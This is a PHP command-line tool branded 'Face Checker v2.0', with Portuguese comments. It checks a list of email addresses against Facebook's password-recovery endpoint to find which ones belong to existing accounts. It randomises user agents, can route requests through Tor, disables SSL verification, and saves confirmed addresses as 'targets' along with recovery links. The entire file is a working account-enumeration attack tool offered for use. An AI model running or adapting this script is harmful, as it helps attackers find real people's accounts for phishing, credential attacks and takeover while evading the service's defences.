<?php


exec('reset');
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
(!isset($_SESSION) ? session_start() : NULL);

$banner = " \033[1;37m
 ____  __    ___  ____    ___  _  _  ____  ___  __ _ 
(  __)/ _\  / __)(  __)  / __)/ )( \(  __)/ __)(  / )
 ) _)/    \( (__  ) _)  ( (__ ) __ ( ) _)( (__  )  (\033[33mv2.0\033[37m
(__) \_/\_/ \___)(____)  \___)\_)(_/(____)\___)(__\_)\033[34m
  === Wisdom is Open but the Knowledge is Priv8 ===
\033[30m";
$_SESSION['config']['cont2'] = 1;

// --------------- DEFININDO LISTA DE EMAILS PARA TESTES -----------------------
echo $banner . "\n\033[1;37m[ ! ] Informe o LISTA DE EMAILS\033[30m\n";
echo "--------------------------------------------------\033[0m\n";
fwrite(STDOUT, "\033[1;37m[ ? ] [ SET ARQUIVO ]: \033[0m");
$listmail = trim(fgets(STDIN));
//------------------------------------------------------------------------------
// ------------------------- DEFININDO PROXY -----------------------------------
echo "\n\033[1;37m[ ! ] Informe tipo de PROXY\n";
echo "[ 1 ]  - TOR\n";
echo "[ 2 ]  - MANUAL\n";
echo "[ 3 ]  - SEM PROXY / DEFAULT\n";
echo "\033[30m--------------------------------------------------\033[0m\n";
fwrite(STDOUT, "\033[1;37m[ ? ][ SET OP ]: \033[30m");
$proxy = trim(fgets(STDIN));
$proxy = (empty($proxy)) ? '3' : NULL;
//VALIDANDO SE OP PROXY FOI SETADA
$proxy = (isset($proxy) && !empty($proxy) &&
        $proxy == '1' ||
        $proxy == '2' ||
        $proxy == '3' ? $proxy : exit("\n\033[1;31m[!] DEFINA CORRETAMENTE OP - PROXY\n\033[0m"));
//SE OP PROXY = 1 SETA ENDEREÇAMENTO PROXY PADRÃO
$proxy = ($proxy == '1') ? 'socks://127.0.0.1:9050/' : $proxy;
$proxy = ($proxy == '3') ? NULL : $proxy;
//SE OP PROXY = 2 SETAR MANUALMENTE
if ($proxy == '2') {
    echo "--------------------------------------------------\033[0m\n";
    fwrite(STDOUT, "\033[1;37m[ ? ][ SET PROXY MANUAL ]: \033[0m");
    $proxy = trim(fgets(STDIN));
}

//------------------------------------------------------------------------------
//GERANDO USER AGENTE RANDOMICO
function __setUserAgentRandom() {

    $agentBrowser = array('Firefox', 'Safari', 'Opera', 'Flock', 'Internet Explorer', 'Seamonkey', 'Tor Browser', 'GNU IceCat', 'CriOS', 'TenFourFox',
        'SeaMonkey', 'B-l-i-t-z-B-O-T', 'Konqueror', 'Mobile', 'Konqueror', 'Netscape', 'Chrome', 'Dragon', 'SeaMonkey', 'Maxthon', 'IBrowse',
        'K-Meleon', 'GoogleBot', 'Konqueror', 'Minimo', 'Googlebot', 'WeltweitimnetzBrowser', 'SuperBot', 'TerrawizBot', 'YodaoBot', 'Wyzo', 'Grail',
        'PycURL', 'Galaxy', 'EnigmaFox', '008', 'ABACHOBot', 'Bimbot', 'Covario IDS', 'iCab', 'KKman', 'Oregano', 'WorldWideWeb', 'Wyzo', 'GNU IceCat',
        'Vimprobable', 'uzbl', 'Slim Browser', 'Flock', 'OmniWeb', 'Rockmelt', 'Shiira', 'Swift', 'Pale Moon', 'Camino', 'Flock', 'Galeon', 'Sylera'
    );

    $agentSistema = array('Windows 3.1', 'Windows 95', 'Windows 98', 'Windows 2000', 'Windows NT', 'Linux 2.4.22-10mdk', 'FreeBSD',
        'Windows XP', 'Windows Vista', 'Redhat Linux', 'Ubuntu', 'Fedora', 'AmigaOS', 'BackTrack Linux', 'iPad', 'BlackBerry', 'Unix',
        'CentOS Linux', 'Debian Linux', 'Macintosh', 'Android', 'iPhone', 'Windows NT 6.1', 'BeOS', 'OS 10.5', 'Nokia', 'Arch Linux',
        'Ark Linux', 'BitLinux', 'Conectiva (Mandriva)', 'CRUX Linux', 'Damn Small Linux', 'DeLi Linux', 'Ubuntu', 'BigLinux', 'Edubuntu',
        'Fluxbuntu', 'Freespire', 'GNewSense', 'Gobuntu', 'gOS', 'Mint Linux', 'Kubuntu', 'Xubuntu', 'ZeVenOS', 'Zebuntu', 'DemoLinux',
        'Dreamlinux', 'DualOS', 'eLearnix', 'Feather Linux', 'Famelix', 'FeniX', 'Gentoo', 'GoboLinux', 'GNUstep', 'Insigne Linux',
        'Kalango', 'KateOS', 'Knoppix', 'Kurumin', 'Dizinha', 'TupiServer', 'Linspire', 'Litrix', 'Mandrake', 'Mandriva', 'MEPIS',
        'Musix GNU Linux', 'Musix-BR', 'OneBase Go', 'openSuSE', 'pQui Linux', 'PCLinuxOS', 'Plaszma OS', 'Puppy Linux', 'QiLinux',
        'Red Hat Linux', 'Red Hat Enterprise Linux', 'CentOS', 'Fedora', 'Resulinux', 'Rxart', 'Sabayon Linux', 'SAM Desktop', 'Satux',
        'Slackware', 'GoblinX', 'Slax', 'Zenwalk', 'SuSE', 'Caixa Mágica', 'HP-UX', 'IRIX', 'OSF/1', 'OS-9', 'POSYS', 'QNX', 'Solaris',
        'OpenSolaris', 'SunOS', 'SCO UNIX', 'Tropix', 'EROS', 'Tru64', 'Digital UNIX', 'Ultrix', 'UniCOS', 'UNIflex', 'Microsoft Xenix',
        'z/OS', 'Xinu', 'Research Unix', 'InfernoOS'
    );

    $locais = array('cs-CZ', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'ar_JO',
        'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'ar_SY', 'ar_TN', 'ar_AE', 'ar_YE', 'ar',
        'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs',
        'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA',
        'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE',
        'de_LU', 'de_CH', 'de', 'el_CY', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'in', 'ga_IE',
        'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY',
        'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME',
        'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV',
        'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE',
        'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk', 'vi_VN', 'vi'
    );
    return $agentBrowser[rand(0, count($agentBrowser) - 1)] . '/' . rand(1, 20) . '.' . rand(0, 20) . ' (' . $agentSistema[rand(0, count($agentSistema) - 1)] . ' ' . rand(1, 7) . '.' . rand(0, 9) . '; ' . $locais[rand(0, count($locais) - 1)] . ';)';
}

//FUNCTION PRINCIPAL
function geral($email, $proxy = NULL) {

    $_SESSION['config']['cont'] = 0;

    $ch = curl_init();
    //DADOS POST CONCATENANDO EMAIL
    $post = "&lsd=AVrNj_gH&email={$email}&did_submit=Procurar&__user=0&__a=1&__dyn=7xe1JAwZwRyUhxPLHwn84a2i5UdoS1Fx-ewICwPyEjwmE&__req=5&__rev=1959518";
    //URL REQUEST CONCATENANDO POST
    $url[1] = "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover" . $post;

    curl_setopt($ch, CURLOPT_URL, $url[1]);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, __setUserAgentRandom());
    curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");

    // -------------------- PROXY --------------------
    if (!is_null($proxy)) {
        curl_setopt($ch, CURLOPT_PROXY, 'socks://127.0.0.1:9050/');
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    }
    // -----------------------------------------------

    $source = curl_exec($ch);
    curl_close($ch);
    return (strstr($source, 'window.location.href=')) ? TRUE : FALSE;
}

(!is_file($listmail) ? exit("\n\033[1;31m[!] Não existe o Dicionário:\033[0m $listmail\n") : NULL);

$lines = array_unique(array_filter(explode("\n", file_get_contents($listmail))));
$count = count($lines);



echo "\n \033[1;33m[0xCarregando] \n";
sleep(2);
echo "\033[31m ===============================================================\n";
echo "\033[34m 0xList  :: \033[37m{$listmail} -\033[34m 0xEmails :: \033[37m{$count}\n";
echo "\033[34m 0xProxy :: \033[37m{$proxy}\n";
echo "\033[31m ===============================================================\n";
echo "\033[37m - VALIANDO DADOS\033[0;0m\n\n";

$ii = 1;
foreach ($lines as $line) {

    $line = str_replace("\n", "", str_replace("\r", "", $line));
    $porcentaje = ($ii / $count) * 100;
    $porcentaje = round($porcentaje, 0);
    if (geral($line, $proxy)) {
        echo " \033[1;34m Opaaaa! :\033[0m \033[1;37m{$porcentaje}%\033[0m";
        echo " \033[1;34m [\033[37m{$_SESSION['config']['cont2']}\033[34m] [\033[37m" . date("H:i:s") . "\033[34m]\n";
        echo " \033[1;37m [ PEII ]\033[0;30m~\033[0;37mEmail Found :: \033[39m{$line}\n";
        echo " \033[1;37m [ INFO ]\033[32m AUTENTICADO COM SUCESSO! :D\033[0m\n";
        echo " \033[1;37m |_____________________________________________________________________________________________\n\n";
        sleep(4);
        $handle = fopen('fbemails.txt', 'a');
        fwrite($handle, "[ {$_SESSION['config']['cont2']} ]-[" . date("H:i:s") . "]-{Alvo Ok}\n ~> https://www.facebook.com/recover/code?em[0]={$line}&hash=AVrNj_gH\n[ - ]::-----------------------------------------------------------------\n\n");
        fclose($handle);
    } else {

        echo " \033[1;34m Andamento em:\033[0m \033[1;37m" . round($porcentaje, 0) . "%\033[0m";
        echo " \033[1;34m [\033[37m{$_SESSION['config']['cont2']}\033[34m] [\033[37m" . date("H:i:s") . "\033[34m]\n";
        echo " \033[1;37m [ LINK ]\033[0;30m~\033[0;37mhttps://m.facebook.com/login/identify?ctx=recover\n";
        echo " \033[1;37m [ DATA ]\033[0;30m~\033[37memail=\033[1;37m{$line}\n";
        echo " \033[1;37m [ INFO ]\033[0;30m~\033[0;37mEmail :: \033[31m{$line}\033[37m NÃO ENCONTRADO!\033[0m \n";
        echo " \033[1;37m |_____________________________________________________________________________________________\n\n";
        sleep(4);
        $handle = fopen('fbemailF.txt', 'a');
        fwrite($handle, "[ {$_SESSION['config']['cont2']} ]-[" . date("H:i:s") . "]-{Alvo Fail}\n [ - ] ~> https://www.facebook.com/recover/code?em[0]={$line}&hash=AVrNj_gH\n[ - ]::-----------------------------------------------------------------\n\n");
        fclose($handle);
    }

    $_SESSION['config']['cont2'] ++;
    $ii++;
}
echo " \033[1;37m [ - ]--------------\033[31m Escaneamento Finalizado \033[37m-------------- [ - ]\033[0;0m\n\n";
sleep(2);